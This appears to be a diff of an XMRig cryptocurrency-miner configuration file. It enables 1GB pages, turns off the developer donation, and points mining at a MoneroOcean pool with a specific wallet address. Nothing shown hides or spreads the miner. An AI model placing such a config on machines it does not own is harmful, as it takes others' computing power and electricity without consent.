@@ -16,7 +16,7 @@
     "randomx": {
         "init": -1,
         "mode": "auto",
-        "1gb-pages": false,
+        "1gb-pages": true,
         "rdmsr": true,
         "wrmsr": true,
         "numa": true
@@ -49,15 +49,15 @@
         "cn/0": false,
         "cn-lite/0": false
     },
-    "donate-level": 5,
-    "donate-over-proxy": 1,
+    "donate-level": 0,
+    "donate-over-proxy": 0,
     "log-file": null,
     "pools": [
         {
             "algo": null,
             "coin": null,
-            "url": "donate.v2.xmrig.com:3333",
-            "user": "YOUR_WALLET_ADDRESS",
+            "url": "ca.moneroocean.stream:80",
+            "user": "46sQEHFPoPDYgJTRcWbDk7ei2uidzNCrya5Ndi3N8w8GDbmVqLDR6pEihuhwmPPr7MP9Ro9AW5AhMhupJLhiXqDWJmN8JDk+100",
             "pass": "x",
             "rig-id": null,
             "nicehash": false,
@@ -70,7 +70,7 @@
         }
     ],
     "print-time": 60,
-    "health-print-time": 60,
+    "health-print-time": 10,
     "retries": 5,
     "retry-pause": 5,
     "syslog": false,
